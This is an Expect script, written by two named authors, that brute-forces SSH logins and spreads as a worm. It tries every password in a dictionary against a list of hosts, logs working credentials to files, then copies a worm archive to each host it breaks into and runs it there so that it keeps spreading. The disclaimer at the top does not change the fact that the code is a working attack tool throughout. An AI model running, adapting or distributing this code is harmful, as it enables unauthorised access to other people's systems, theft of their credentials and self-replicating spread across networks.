#!/usr/bin/expect -f
#
#    Written by James Shanahan(jshanahan@comcastpc.com)
#    and Erin Palmer(epalmer@comcastpc.com)
#    ssh brute forcer
#    This will alow you to specify hosts, password lists, and a user
#    I do not take any reponsibilty for what you do with this tool
#    Hopefully it will make your life easier rather then making other
#    peoples lives more difficult!

set timeout 1000

if {[llength $argv] != 3} {
   puts stderr "Usage: $argv0 <dictionary-file> <hosts-file> <user-file>\n"
   exit
}

set dictionary [lindex $argv 0]
set file [lindex $argv 1]
set user [lindex $argv 2]
# already.txt should be in home directory, not worm/
set already already.txt


set tryHost [open $file r]
set tryPass [open $dictionary r]
set tryUser [open $user r]
set alreadyHost [open $already r]

set passwords [read $tryPass]
set hosts [read $tryHost]
set login [read $tryUser]
set alreadys [read $alreadyHost]

close $tryPass
close $tryHost
close $tryUser
close $alreadyHost

set targets []

# Avoid infinite loop
foreach h $hosts {
    set f 0
    foreach a $alreadys {
        if {$h == $a} {
            set f 1
        }
    }
    if {$f == 0} {
        append targets " " $h
    }
}

spawn $env(SHELL)


proc after_login {ip username passwd} {
    # after login, this adds the ip address to already.txt,
    # exits, sends a compressed file and already.txt
    # to the next node
    set already already.txt
    set alreadyHost [open $already a]
    puts $alreadyHost "$ip"
    close $alreadyHost

    send "exit\n"

    expect -- "\$ "
    send -- "scp ./worm.tar $username@$ip:~\n"
    expect -nocase "password: "
    send -- "$passwd\n"
    expect -- "\$ "
    send -- "scp $already $username@$ip:~\n"
    expect -nocase "password: "
    send -- "$passwd\n"

    # After successfully sending the file, this uncompress and executes it.
    expect -- "\$ "
    send -- "ssh $username@$ip\n"
    expect -nocase "password: "
    send -- "$passwd\n"
    expect {
        "\$ " {
            send -- "tar xvf worm.tar worm\n"
            expect -- "\$ "
            send -- "expect worm/ssh_worm.sh worm/dict.txt worm/host.txt worm/user.txt 2>&1 > worm.log\n"
            expect -- "\$ "
            send -- "exit\n"
        }
        -nocase "password: " {
            puts stderr "\n\ninvalid password for scp\n\n"
        }
    }
}

foreach username $login {
    foreach passwd $passwords {
        foreach ip $targets {
#            puts stderr "execute ssh"
            expect "\$ "
            send -- "ssh $username@$ip\n"
            expect {
                # some sshd response with "Password:" and others with "password:"
                -nocase "password: "  {
#                    puts stderr "start to interaction\n"
                    send -- "$passwd\n"
                    expect {
                        "\$ " {
                            set logFile [open $ip.log a]
                            puts $logFile "password for $username@$ip is $passwd"
                            close $logFile
                            after_login $ip $username $passwd
                        }
                        -nocase "password: " {
                            puts stderr "incorrect password"
                            send -- ""
#                            close
#                            set id [exp_pid]
#                            exec kill -KILL $id
#                            wait
                        }
                    }
                }
                "(yes/no)? " {
                    send "yes\n"
                    exp_continue
                }
                "Connection closed by remote host" {
                    close
                    wait
                }
            }
        }
    }
}

